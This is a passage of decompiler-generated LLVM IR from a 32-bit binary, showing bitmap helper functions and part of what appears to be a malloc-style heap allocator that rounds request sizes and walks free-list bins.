  br i1 %v2_804b66f, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_804b65e
  %v5_804b675 = shl i32 1, %v1_804b66f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_804b65e, %bb
  %v6_804b677 = phi i32 [ 1, %dec_label_pc_804b65e ], [ %v5_804b675, %bb ]
  %v2_804b677 = mul nuw nsw i32 %v2_804b672, 4
  %v3_804b677 = add i32 %v2_804b677, %arg1
  %v4_804b677 = inttoptr i32 %v3_804b677 to i32*
  %v5_804b677 = load i32, i32* %v4_804b677, align 4
  %v7_804b677 = and i32 %v5_804b677, %v6_804b677
  %v8_804b677 = icmp eq i32 %v7_804b677, 0
  %v1_804b67b = icmp eq i1 %v8_804b677, false
  %v2_804b67b = zext i1 %v1_804b67b to i32
  ret i32 %v2_804b67b

; uselistorder directives
  uselistorder i32 %v1_804b66f, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_804b682(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b682:
  %stack_var_-4 = alloca i32, align 4
  %v0_804b682 = load i32, i32* @ebx, align 4
  store i32 %v0_804b682, i32* %stack_var_-4, align 4
  %v1_804b690 = add i32 %arg2, -1
  %v1_804b693 = urem i32 %v1_804b690, 32
  %v2_804b693 = icmp eq i32 %v1_804b693, 0
  store i32 %v1_804b693, i32* @ecx, align 4
  br i1 %v2_804b693, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_804b682
  %v5_804b696 = shl i32 1, %v1_804b693
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_804b682, %bb
  %v6_804b69b = phi i32 [ 1, %dec_label_pc_804b682 ], [ %v5_804b696, %bb ]
  %v2_804b698 = udiv i32 %v1_804b690, 32
  store i32 %v2_804b698, i32* @edx, align 4
  %v2_804b69b = mul nuw nsw i32 %v2_804b698, 4
  %v3_804b69b = add i32 %v2_804b69b, %arg1
  %v4_804b69b = inttoptr i32 %v3_804b69b to i32*
  %v5_804b69b = load i32, i32* %v4_804b69b, align 4
  %v7_804b69b = or i32 %v5_804b69b, %v6_804b69b
  store i32 %v7_804b69b, i32* %v4_804b69b, align 4
  %v2_804b6a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b6a0, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804b698, { 1, 0 }
  uselistorder i32 %v1_804b693, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_804b6a2() local_unnamed_addr {
dec_label_pc_804b6a2:
  %v0_804b6a2 = load i32, i32* @eax, align 4
  %v6_804b6b5 = icmp ugt i32 %v0_804b6a2, 16777215
  br i1 %v6_804b6b5, label %dec_label_pc_804b6c6, label %dec_label_pc_804b6b7

dec_label_pc_804b6b7:                             ; preds = %dec_label_pc_804b6a2
  %tmp = icmp ult i32 %v0_804b6a2, 256
  %v2_804b6a4 = udiv i32 %v0_804b6a2, 256
  %v2_804b6b7 = call i32 @llvm.ctlz.i32(i32 %v2_804b6a4, i1 true)
  %v3_804b6b7 = xor i32 %v2_804b6b7, 31
  %v5_804b6b7 = select i1 %tmp, i32 95, i32 %v3_804b6b7
  %v1_804b6ba = add nuw nsw i32 %v5_804b6b7, 6
  store i32 %v1_804b6ba, i32* @ecx, align 4
  %v2_804b6bd = urem i32 %v1_804b6ba, 32
  %v4_804b6bd = icmp eq i32 %v2_804b6bd, 0
  br i1 %v4_804b6bd, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804b6b7
  %v5_804b6bd = lshr i32 %v0_804b6a2, %v2_804b6bd
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804b6b7, %bb
  %v0_804b6bf = phi i32 [ %v0_804b6a2, %dec_label_pc_804b6b7 ], [ %v5_804b6bd, %bb ]
  %v1_804b6bf = urem i32 %v0_804b6bf, 4
  %v2_804b6c2 = mul nuw nsw i32 %v5_804b6b7, 4
  %v3_804b6c2 = or i32 %v1_804b6bf, 32
  %v4_804b6c2 = add nuw nsw i32 %v3_804b6c2, %v2_804b6c2
  br label %dec_label_pc_804b6c6

dec_label_pc_804b6c6:                             ; preds = %dec_label_pc_804b6a2, %bb4
  %v0_804b6c7 = phi i32 [ 95, %dec_label_pc_804b6a2 ], [ %v4_804b6c2, %bb4 ]
  ret i32 %v0_804b6c7

; uselistorder directives
  uselistorder i32 %v2_804b6bd, { 1, 0 }
  uselistorder i32 %v0_804b6a2, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b6c6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804b6c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b6c8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b6c8 = load i32, i32* @ebp, align 4
  %v0_804b6c9 = load i32, i32* @edi, align 4
  %v0_804b6ca = load i32, i32* @esi, align 4
  %v0_804b6cb = load i32, i32* @ebx, align 4
  store i32 %v0_804b6cb, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804b6dd = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b6dd, i32* @eax, align 4
  store i32 %v2_804b6dd, i32* %stack_var_-92, align 4
  %v2_804b6e2 = call i32 @function_804c7b7(i32 %v2_804b6dd, i32 134530996)
  store i32 %v2_804b6e2, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_804f608.78 to i32), i32* %stack_var_-92, align 4
  %v1_804b6ee = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f608.78 to i32))
  store i32 %v1_804b6ee, i32* %eax.global-to-local, align 4
  %v0_804b6f6 = load i32, i32* %ebx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_804b6f6, -32
  br i1 %tmp126, label %dec_label_pc_804b70d, label %dec_label_pc_804b6fb

dec_label_pc_804b6fb:                             ; preds = %dec_label_pc_804b6c8
  %v0_804b6fb = load i32, i32* %stack_var_-92, align 4
  %v1_804b6fb = call i32 @function_804b330(i32 %v0_804b6fb)
  store i32 %v1_804b6fb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804b702 = inttoptr i32 %v1_804b6fb to i32*
  store i32 12, i32* %v1_804b702, align 4
  br label %dec_label_pc_804be60

dec_label_pc_804b70d:                             ; preds = %dec_label_pc_804b6c8
  %v1_804b70d = add i32 %v0_804b6f6, 11
  %tmp127 = icmp ult i32 %v1_804b70d, 16
  br i1 %tmp127, label %dec_label_pc_804b724, label %dec_label_pc_804b71d

dec_label_pc_804b71d:                             ; preds = %dec_label_pc_804b70d
  %v1_804b71d = and i32 %v1_804b70d, -8
  br label %dec_label_pc_804b724

dec_label_pc_804b724:                             ; preds = %dec_label_pc_804b70d, %dec_label_pc_804b71d
  %storemerge133 = phi i32 [ %v1_804b71d, %dec_label_pc_804b71d ], [ %v1_804b70d, %dec_label_pc_804b70d ]
  %v1_804bac4 = phi i32 [ %v1_804b71d, %dec_label_pc_804b71d ], [ 16, %dec_label_pc_804b70d ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_804b724 = load i8, i8* @global_var_804f760.79, align 1
  %v1_804b724 = sext i8 %v0_804b724 to i32
  store i32 %v1_804b724, i32* @ebx, align 4
  %v3_804b72a = urem i8 %v0_804b724, 2
  %v4_804b72a = icmp eq i8 %v3_804b72a, 0
  %v1_804b72d = icmp eq i1 %v4_804b72a, false
  br i1 %v1_804b72d, label %dec_label_pc_804b74c, label %dec_label_pc_804b72f

dec_label_pc_804b72f:                             ; preds = %dec_label_pc_804b724
  %v2_804b72f = icmp eq i8 %v0_804b724, 0
  %v1_804b731 = icmp eq i1 %v2_804b72f, false
  br i1 %v1_804b731, label %dec_label_pc_804ba2f, label %dec_label_pc_804b737

dec_label_pc_804b737:                             ; preds = %dec_label_pc_804b72f
  store i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32* %stack_var_-92, align 4
  %v2_804b73f = call i32 @function_804bfeb(i32* bitcast (i8* @global_var_804f760.79 to i32*))
  store i32 %v2_804b73f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ba2f

dec_label_pc_804b74c:                             ; preds = %dec_label_pc_804b724
  %v11_804b74c = trunc i32 %v1_804bac4 to i8
  %v8_804b750 = icmp ugt i8 %v11_804b74c, %v0_804b724
  br i1 %v8_804b750, label %dec_label_pc_804b76d, label %dec_label_pc_804b752

dec_label_pc_804b752:                             ; preds = %dec_label_pc_804b74c
  %v2_804b756 = udiv i32 %v1_804bac4, 2
  store i32 %v2_804b756, i32* %eax.global-to-local, align 4
  %v1_804b758 = add i32 %v2_804b756, ptrtoint (i8* @global_var_804f760.79 to i32)
  store i32 %v1_804b758, i32* @ecx, align 4
  %v1_804b75e = add i32 %v2_804b756, add (i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32 -4)
  %v2_804b75e = inttoptr i32 %v1_804b75e to i32*
  %v3_804b75e = load i32, i32* %v2_804b75e, align 4
  store i32 %v3_804b75e, i32* @edx, align 4
  %v1_804b761 = icmp eq i32 %v3_804b75e, 0
  br i1 %v1_804b761, label %dec_label_pc_804b76d, label %dec_label_pc_804b765

dec_label_pc_804b765:                             ; preds = %dec_label_pc_804b752
  %v1_804b765 = add i32 %v3_804b75e, 8
  %v2_804b765 = inttoptr i32 %v1_804b765 to i32*
  %v3_804b765 = load i32, i32* %v2_804b765, align 4
  store i32 %v3_804b765, i32* %eax.global-to-local, align 4
  store i32 %v3_804b765, i32* %v2_804b75e, align 4
  br label %dec_label_pc_804b7a6

dec_label_pc_804b76d:                             ; preds = %dec_label_pc_804b752, %dec_label_pc_804b74c
  %v8_804b76d = icmp ult i32 %v1_804bac4, 255
  %v6_804b775 = icmp ugt i32 %v1_804bac4, 255
  store i32 %v1_804bac4, i32* @eax, align 4
  br i1 %v6_804b775, label %dec_label_pc_804b7ae, label %dec_label_pc_804b777

dec_label_pc_804b777:                             ; preds = %dec_label_pc_804b76d
  %v2_804b77b = udiv i32 %v1_804bac4, 8
  store i32 %v2_804b77b, i32* %eax.global-to-local, align 4
  %v1_804b77e = mul nuw i32 %v2_804b77b, 8
  %v2_804b77e = add i32 %v1_804b77e, ptrtoint (i32* @global_var_804f78c.80 to i32)
  store i32 %v2_804b77e, i32* @ecx, align 4
  %v1_804b789 = add i32 %v1_804b77e, add (i32 ptrtoint (i32* @global_var_804f78c.80 to i32), i32 12)
  %v2_804b789 = inttoptr i32 %v1_804b789 to i32*
  %v3_804b789 = load i32, i32* %v2_804b789, align 4
  store i32 %v3_804b789, i32* @edx, align 4
  %v12_804b78c = icmp eq i32 %v3_804b789, %v2_804b77e
  br i1 %v12_804b78c, label %dec_label_pc_804b8aa.preheader, label %dec_label_pc_804b794

dec_label_pc_804b794:                             ; preds = %dec_label_pc_804b777
  store i32 %v1_804bac4, i32* %ebx.global-to-local, align 4
  %v1_804b798 = add i32 %v3_804b789, 12
  %v2_804b798 = inttoptr i32 %v1_804b798 to i32*
  %v3_804b798 = load i32, i32* %v2_804b798, align 4
  store i32 %v3_804b798, i32* %eax.global-to-local, align 4
  %v2_804b79b = or i32 %v1_804bac4, 4
  %v3_804b79b = add i32 %v3_804b789, %v2_804b79b
  %v4_804b79b = inttoptr i32 %v3_804b79b to i32*
  %v5_804b79b = load i32, i32* %v4_804b79b, align 4
  %v6_804b79b = or i32 %v5_804b79b, 1
  store i32 %v6_804b79b, i32* %v4_804b79b, align 4
  %v0_804b7a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7a0 = load i32, i32* @ecx, align 4
  %v2_804b7a0 = add i32 %v1_804b7a0, 12
  %v3_804b7a0 = inttoptr i32 %v2_804b7a0 to i32*
  store i32 %v0_804b7a0, i32* %v3_804b7a0, align 4
  %v0_804b7a3 = load i32, i32* @ecx, align 4
  %v1_804b7a3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b7a3 = add i32 %v1_804b7a3, 8
  %v3_804b7a3 = inttoptr i32 %v2_804b7a3 to i32*
  store i32 %v0_804b7a3, i32* %v3_804b7a3, align 4
  br label %dec_label_pc_804b7a6

dec_label_pc_804b7a6:                             ; preds = %dec_label_pc_804b765, %dec_label_pc_804b794
  %v0_804b7a6 = load i32, i32* @edx, align 4
  %v1_804b7a6 = add i32 %v0_804b7a6, 8
  store i32 %v1_804b7a6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804b7ae:                             ; preds = %dec_label_pc_804b76d
  %v0_804b7b2 = call i32 @function_804b6a2()
  store i32 %v0_804b7b2, i32* %eax.global-to-local, align 4
  %v3_804b7b7 = and i8 %v0_804b724, 2
  %v4_804b7b7 = icmp eq i8 %v3_804b7b7, 0
  br i1 %v4_804b7b7, label %dec_label_pc_804b8aa.preheader, label %dec_label_pc_804b7c4

dec_label_pc_804b7c4:                             ; preds = %dec_label_pc_804b7ae
  store i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32* %stack_var_-92, align 4
  %v2_804b7cc = call i32 @function_804bfeb(i32* bitcast (i8* @global_var_804f760.79 to i32*))
  store i32 %v2_804b7cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8aa.preheader

dec_label_pc_804b8aa.preheader:                   ; preds = %dec_label_pc_804b7c4, %dec_label_pc_804b777, %dec_label_pc_804b7ae
  %stack_var_-40.0.ph = phi i32 [ %v2_804b77b, %dec_label_pc_804b777 ], [ %v0_804b7b2, %dec_label_pc_804b7c4 ], [ %v0_804b7b2, %dec_label_pc_804b7ae ]
  %v0_804b8aa9 = load i32, i32* @global_var_804f7a0.83, align 32
  store i32 %v0_804b8aa9, i32* @ebp, align 4
  %v9_804b8b015 = icmp eq i32 %v0_804b8aa9, 134543252
  %v1_804b8b617 = icmp eq i1 %v9_804b8b015, false
  br i1 %v1_804b8b617, label %dec_label_pc_804b7d9.lr.ph, label %dec_label_pc_804b8bc

dec_label_pc_804b7d9.lr.ph:                       ; preds = %dec_label_pc_804b8aa.preheader
  %v1_804b800 = add i32 %v1_804bac4, 16
  br label %dec_label_pc_804b7d9

dec_label_pc_804b7d9:                             ; preds = %dec_label_pc_804b7d9.lr.ph, %dec_label_pc_804b8aa
  %v1_804be01 = phi i32 [ %v0_804b8aa9, %dec_label_pc_804b7d9.lr.ph ], [ %v0_804b8aa, %dec_label_pc_804b8aa ]
  %v1_804b7d9 = add i32 %v1_804be01, 4
  %v2_804b7d9 = inttoptr i32 %v1_804b7d9 to i32*
  %v3_804b7d9 = load i32, i32* %v2_804b7d9, align 4
  %v1_804b7dc = add i32 %v1_804be01, 12
  %v2_804b7dc = inttoptr i32 %v1_804b7dc to i32*
  %v3_804b7dc = load i32, i32* %v2_804b7dc, align 4
  store i32 %v3_804b7dc, i32* @edx, align 4
  %v1_804b7df = and i32 %v3_804b7d9, -4
  store i32 %v1_804b7df, i32* @edi, align 4
  br i1 %v6_804b775, label %dec_label_pc_804b80b, label %dec_label_pc_804b7ec

dec_label_pc_804b7ec:                             ; preds = %dec_label_pc_804b7d9
  %v9_804b7ec = icmp eq i32 %v3_804b7dc, 134543252
  %v1_804b7f2 = icmp eq i1 %v9_804b7ec, false
  br i1 %v1_804b7f2, label %dec_label_pc_804b80b, label %dec_label_pc_804b7f4

dec_label_pc_804b7f4:                             ; preds = %dec_label_pc_804b7ec
  %v1_804b7f4 = load i32, i32* @global_var_804f790.81, align 16
  %v12_804b7f4 = icmp eq i32 %v1_804be01, %v1_804b7f4
  %v1_804b7fa = icmp eq i1 %v12_804b7f4, false
  br i1 %v1_804b7fa, label %dec_label_pc_804b80b, label %dec_label_pc_804b7fc

dec_label_pc_804b7fc:                             ; preds = %dec_label_pc_804b7f4
  store i32 %v1_804b800, i32* %eax.global-to-local, align 4
  %v6_804b805 = icmp ugt i32 %v1_804b7df, %v1_804b800
  br i1 %v6_804b805, label %dec_label_pc_804bdea, label %dec_label_pc_804b80b

dec_label_pc_804b80b:                             ; preds = %dec_label_pc_804b7fc, %dec_label_pc_804b7f4, %dec_label_pc_804b7ec, %dec_label_pc_804b7d9
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804b7dc, i32* @global_var_804f7a0.83, align 4
  %v2_804b813 = add i32 %v3_804b7dc, 8
  %v3_804b813 = inttoptr i32 %v2_804b813 to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v3_804b813, align 4
  %v0_804b816 = load i32, i32* @edi, align 4
  %v15_804b816 = icmp eq i32 %v0_804b816, %v1_804bac4
  br i1 %v15_804b816, label %dec_label_pc_804be2b, label %dec_label_pc_804b820

dec_label_pc_804b820:                             ; preds = %dec_label_pc_804b80b
  %v6_804b826 = icmp ugt i32 %v0_804b816, 255
  br i1 %v6_804b826, label %dec_label_pc_804b839, label %dec_label_pc_804b828

dec_label_pc_804b828:                             ; preds = %dec_label_pc_804b820
  %v2_804b82a = udiv i32 %v0_804b816, 8
  store i32 %v2_804b82a, i32* %esi.global-to-local, align 4
  %v1_804b82d = mul nuw i32 %v2_804b82a, 8
  %v2_804b82d = add i32 %v1_804b82d, 134543244
  store i32 %v2_804b82d, i32* @ebx, align 4
  %v1_804b834 = add i32 %v1_804b82d, 134543252
  %v2_804b834 = inttoptr i32 %v1_804b834 to i32*
  %v3_804b834 = load i32, i32* %v2_804b834, align 4
  store i32 %v3_804b834, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b882

dec_label_pc_804b839:                             ; preds = %dec_label_pc_804b820
  store i32 %v0_804b816, i32* @eax, align 4
  %v0_804b83b = call i32 @function_804b6a2()
  store i32 %v0_804b83b, i32* %esi.global-to-local, align 4
  %v1_804b842 = mul i32 %v0_804b83b, 8
  %v2_804b842 = add i32 %v1_804b842, ptrtoint (i32* @global_var_804f78c.80 to i32)
  store i32 %v2_804b842, i32* %eax.global-to-local, align 4
  %v1_804b849 = add i32 %v1_804b842, add (i32 ptrtoint (i32* @global_var_804f78c.80 to i32), i32 8)
  %v2_804b849 = inttoptr i32 %v1_804b849 to i32*
  %v3_804b849 = load i32, i32* %v2_804b849, align 4
  store i32 %v3_804b849, i32* %edx.global-to-local, align 4
  %v12_804b84c = icmp eq i32 %v3_804b849, %v2_804b842
  store i32 %v3_804b849, i32* @ebx, align 4
  br i1 %v12_804b84c, label %dec_label_pc_804b882, label %dec_label_pc_804b856

dec_label_pc_804b856:                             ; preds = %dec_label_pc_804b839
  %v1_804b856 = add i32 %v1_804b842, add (i32 ptrtoint (i32* @global_var_804f78c.80 to i32), i32 12)
  %v2_804b856 = inttoptr i32 %v1_804b856 to i32*
  %v3_804b856 = load i32, i32* %v2_804b856, align 4
  store i32 %v3_804b856, i32* @ebx, align 4
  %v0_804b859 = load i32, i32* @edi, align 4
  %v2_804b859 = add i32 %v3_804b856, 4
  %v3_804b859 = inttoptr i32 %v2_804b859 to i32*
  %v4_804b859 = load i32, i32* %v3_804b859, align 4
  %v10_804b859 = icmp ult i32 %v0_804b859, %v4_804b859
  %v1_804b85c = icmp eq i1 %v10_804b859, false
  br i1 %v1_804b85c, label %dec_label_pc_804b864, label %dec_label_pc_804b882

dec_label_pc_804b864:                             ; preds = %dec_label_pc_804b856
  %v1_804b866 = or i32 %v0_804b859, 1
  store i32 %v1_804b866, i32* %eax.global-to-local, align 4
  store i32 %v3_804b849, i32* %ebx.global-to-local, align 4
  %v2_804b87a107 = add i32 %v3_804b849, 4
  %v3_804b87a108 = inttoptr i32 %v2_804b87a107 to i32*
  %v4_804b87a109 = load i32, i32* %v3_804b87a108, align 4
  %v10_804b87a110 = icmp ult i32 %v1_804b866, %v4_804b87a109
  br i1 %v10_804b87a110, label %dec_label_pc_804b86b, label %dec_label_pc_804b87f

dec_label_pc_804b86b:                             ; preds = %dec_label_pc_804b864, %dec_label_pc_804b86b
  %v0_804b87f111 = phi i32 [ %v3_804b86f, %dec_label_pc_804b86b ], [ %v3_804b849, %dec_label_pc_804b864 ]
  store i32 %v0_804b87f111, i32* %ecx.global-to-local, align 4
  %v1_804b86f = add i32 %v0_804b87f111, 8
  %v2_804b86f = inttoptr i32 %v1_804b86f to i32*
  %v3_804b86f = load i32, i32* %v2_804b86f, align 4
  store i32 %v3_804b86f, i32* %ecx.global-to-local, align 4
  store i32 %v3_804b86f, i32* %ebx.global-to-local, align 4
  %v2_804b87a = add i32 %v3_804b86f, 4
  %v3_804b87a = inttoptr i32 %v2_804b87a to i32*
  %v4_804b87a = load i32, i32* %v3_804b87a, align 4
  %v10_804b87a = icmp ult i32 %v1_804b866, %v4_804b87a
  br i1 %v10_804b87a, label %dec_label_pc_804b86b, label %dec_label_pc_804b87f

dec_label_pc_804b87f:                             ; preds = %dec_label_pc_804b86b, %dec_label_pc_804b864
  %v0_804b87f.lcssa = phi i32 [ %v3_804b849, %dec_label_pc_804b864 ], [ %v3_804b86f, %dec_label_pc_804b86b ]
  %v1_804b87f = add i32 %v0_804b87f.lcssa, 12
  %v2_804b87f = inttoptr i32 %v1_804b87f to i32*
  %v3_804b87f = load i32, i32* %v2_804b87f, align 4
  store i32 %v3_804b87f, i32* @ebx, align 4
  br label %dec_label_pc_804b882

dec_label_pc_804b882:                             ; preds = %dec_label_pc_804b828, %dec_label_pc_804b856, %dec_label_pc_804b839, %dec_label_pc_804b87f
  %v0_804b882 = phi i32 [ %v0_804b83b, %dec_label_pc_804b839 ], [ %v0_804b83b, %dec_label_pc_804b87f ], [ %v0_804b83b, %dec_label_pc_804b856 ], [ %v2_804b82a, %dec_label_pc_804b828 ]
  %stack_var_-64.1 = phi i32 [ %v2_804b842, %dec_label_pc_804b839 ], [ %v0_804b87f.lcssa, %dec_label_pc_804b87f ], [ %v2_804b842, %dec_label_pc_804b856 ], [ %v3_804b834, %dec_label_pc_804b828 ]
  %v1_804b884 = urem i32 %v0_804b882, 32
  %v2_804b884 = icmp eq i32 %v1_804b884, 0
  store i32 %v1_804b884, i32* %esi.global-to-local, align 4
  store i32 %v1_804b884, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804b88e = sdiv i32 %v0_804b882, 32
  store i32 %v2_804b88e, i32* %edx.global-to-local, align 4
  br i1 %v2_804b884, label %dec_label_pc_804b8aa, label %bb

bb:                                               ; preds = %dec_label_pc_804b882
  %v5_804b891 = shl i32 1, %v1_804b884
  store i32 %v5_804b891, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8aa

dec_label_pc_804b8aa:                             ; preds = %dec_label_pc_804b882, %bb
  %v5_804b893 = phi i32 [ 1, %dec_label_pc_804b882 ], [ %v5_804b891, %bb ]
  %v1_804b893 = mul nsw i32 %v2_804b88e, 4
  %v2_804b893 = add i32 %v1_804b893, ptrtoint (i32* @global_var_804fa94.84 to i32)
  %v3_804b893 = inttoptr i32 %v2_804b893 to i32*
  %v4_804b893 = load i32, i32* %v3_804b893, align 4
  %v6_804b893 = or i32 %v4_804b893, %v5_804b893
  store i32 %v6_804b893, i32* %v3_804b893, align 4
  %v0_804b89a = load i32, i32* @ebx, align 4
  %v1_804b89a = load i32, i32* @ebp, align 4
  %v2_804b89a = add i32 %v1_804b89a, 12
  %v3_804b89a = inttoptr i32 %v2_804b89a to i32*
  store i32 %v0_804b89a, i32* %v3_804b89a, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804b8a1 = load i32, i32* @ebp, align 4
  %v2_804b8a1 = add i32 %v1_804b8a1, 8
  %v3_804b8a1 = inttoptr i32 %v2_804b8a1 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804b8a1, align 4
  %v0_804b8a4 = load i32, i32* @ebp, align 4
  %v1_804b8a4 = load i32, i32* @esi, align 4
  %v2_804b8a4 = add i32 %v1_804b8a4, 12
  %v3_804b8a4 = inttoptr i32 %v2_804b8a4 to i32*
  store i32 %v0_804b8a4, i32* %v3_804b8a4, align 4
  %v0_804b8a7 = load i32, i32* @ebp, align 4
  %v1_804b8a7 = load i32, i32* @ebx, align 4
  %v2_804b8a7 = add i32 %v1_804b8a7, 8
  %v3_804b8a7 = inttoptr i32 %v2_804b8a7 to i32*
  store i32 %v0_804b8a7, i32* %v3_804b8a7, align 4
  %v0_804b8aa = load i32, i32* @global_var_804f7a0.83, align 32
  store i32 %v0_804b8aa, i32* @ebp, align 4
  %v9_804b8b0 = icmp eq i32 %v0_804b8aa, 134543252
  %v1_804b8b6 = icmp eq i1 %v9_804b8b0, false
  br i1 %v1_804b8b6, label %dec_label_pc_804b7d9, label %dec_label_pc_804b8bc

dec_label_pc_804b8bc:                             ; preds = %dec_label_pc_804b8aa, %dec_label_pc_804b8aa.preheader
  br i1 %v8_804b76d, label %dec_label_pc_804b94a, label %dec_label_pc_804b8ca

dec_label_pc_804b8ca:                             ; preds = %dec_label_pc_804b8bc
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804b8ce = mul i32 %stack_var_-40.0.ph, 8
  %v2_804b8ce = add i32 %v1_804b8ce, ptrtoint (i32* @global_var_804f78c.80 to i32)
  store i32 %v2_804b8ce, i32* %edx.global-to-local, align 4
  %v1_804b8d5 = add i32 %v1_804b8ce, add (i32 ptrtoint (i32* @global_var_804f78c.80 to i32), i32 12)
  %v2_804b8d5 = inttoptr i32 %v1_804b8d5 to i32*
  %storemerge1.pre = load i32, i32* %v2_804b8d5, align 4
  br label %dec_label_pc_804b946

dec_label_pc_804b8da:                             ; preds = %dec_label_pc_804b946
  %v1_804b8da = add i32 %v4_804b8f1, 4
  %v2_804b8da = inttoptr i32 %v1_804b8da to i32*
  %v3_804b8da = load i32, i32* %v2_804b8da, align 4
  store i32 %v3_804b8da, i32* %ebx.global-to-local, align 4
  %v1_804b8dd = add i32 %v4_804b8f1, 12
  %v2_804b8dd = inttoptr i32 %v1_804b8dd to i32*
  %v3_804b8dd = load i32, i32* %v2_804b8dd, align 4
  store i32 %v3_804b8dd, i32* @ecx, align 4
  %v1_804b8e0 = and i32 %v3_804b8da, -4
  store i32 %v1_804b8e0, i32* @ebx, align 4
  %v10_804b8e3 = icmp ult i32 %v1_804b8e0, %v1_804bac4
  br i1 %v10_804b8e3, label %dec_label_pc_804b946, label %dec_label_pc_804b8e9

dec_label_pc_804b8e9:                             ; preds = %dec_label_pc_804b8da
  %v1_804b8e9 = add i32 %v4_804b8f1, 8
  %v2_804b8e9 = inttoptr i32 %v1_804b8e9 to i32*
  %v3_804b8e9 = load i32, i32* %v2_804b8e9, align 4
  store i32 %v3_804b8e9, i32* @edx, align 4
  %v1_804b8ec = add i32 %v3_804b8e9, 12
  %v2_804b8ec = inttoptr i32 %v1_804b8ec to i32*
  %v3_804b8ec = load i32, i32* %v2_804b8ec, align 4
  %v15_804b8ec = icmp eq i32 %v3_804b8ec, %v4_804b8f1
  %v1_804b8ef = icmp eq i1 %v15_804b8ec, false
  br i1 %v1_804b8ef, label %dec_label_pc_804b8f6, label %dec_label_pc_804b8f1

dec_label_pc_804b8f1:                             ; preds = %dec_label_pc_804b8e9
  %v1_804b8f1 = add i32 %v3_804b8dd, 8
  %v2_804b8f1 = inttoptr i32 %v1_804b8f1 to i32*
  %v3_804b8f1 = load i32, i32* %v2_804b8f1, align 4
  %v15_804b8f1 = icmp eq i32 %v3_804b8f1, %v4_804b8f1
  br i1 %v15_804b8f1, label %dec_label_pc_804b8fb, label %dec_label_pc_804b8f6

dec_label_pc_804b8f6:                             ; preds = %dec_label_pc_804b8f1, %dec_label_pc_804b8e9
  %v0_804b8f6 = call i32 @function_804c32f()
  store i32 %v0_804b8f6, i32* %eax.global-to-local, align 4
  %v0_804b8fb.pre = load i32, i32* @ebx, align 4
  %v0_804b901.pre = load i32, i32* @ecx, align 4
  %v1_804b901.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804b8fb

dec_label_pc_804b8fb:                             ; preds = %dec_label_pc_804b8f1, %dec_label_pc_804b8f6
  %v1_804b901 = phi i32 [ %v3_804b8e9, %dec_label_pc_804b8f1 ], [ %v1_804b901.pre, %dec_label_pc_804b8f6 ]
  %v0_804b901 = phi i32 [ %v3_804b8dd, %dec_label_pc_804b8f1 ], [ %v0_804b901.pre, %dec_label_pc_804b8f6 ]
  %v0_804b8fb = phi i32 [ %v1_804b8e0, %dec_label_pc_804b8f1 ], [ %v0_804b8fb.pre, %dec_label_pc_804b8f6 ]
  %v5_804b8fd = sub i32 %v0_804b8fb, %v1_804bac4
  store i32 %v5_804b8fd, i32* %esi.global-to-local, align 4
  %v2_804b901 = add i32 %v1_804b901, 12
  %v3_804b901 = inttoptr i32 %v2_804b901 to i32*
  store i32 %v0_804b901, i32* %v3_804b901, align 4
  %v0_804b904 = load i32, i32* @edx, align 4
  %v1_804b904 = load i32, i32* @ecx, align 4
  %v2_804b904 = add i32 %v1_804b904, 8
  %v3_804b904 = inttoptr i32 %v2_804b904 to i32*
  store i32 %v0_804b904, i32* %v3_804b904, align 4
  %v0_804b907 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b907 = add i32 %v0_804b907, 8
  store i32 %v1_804b907, i32* @ecx, align 4
  %v0_804b90a = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804b90a, 16
  br i1 %tmp128, label %dec_label_pc_804be39, label %dec_label_pc_804b913

